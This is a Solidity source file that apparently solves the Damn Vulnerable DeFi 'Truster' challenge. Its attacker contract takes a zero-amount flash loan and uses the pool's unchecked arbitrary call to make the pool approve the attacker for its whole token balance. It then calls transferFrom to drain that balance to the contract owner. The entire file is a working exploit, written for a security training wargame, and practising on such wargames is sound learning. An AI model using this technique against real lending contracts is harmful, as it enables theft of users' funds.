// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ILenderPool {
    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data) external;
}

contract AttackerApproveTokensContract{

    address private owner;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
        owner=msg.sender;
    }

    function drainPoolFunds(address poolAddress,uint256 poolBalance) external
    {
        require(msg.sender==owner,"Only owner can call this function");
        ILenderPool(poolAddress).flashLoan(0,address(this),address(damnValuableToken),
        abi.encodeWithSignature("approve(address,uint256)",address(this),poolBalance));
        damnValuableToken.transferFrom(poolAddress, owner, poolBalance);
    }

}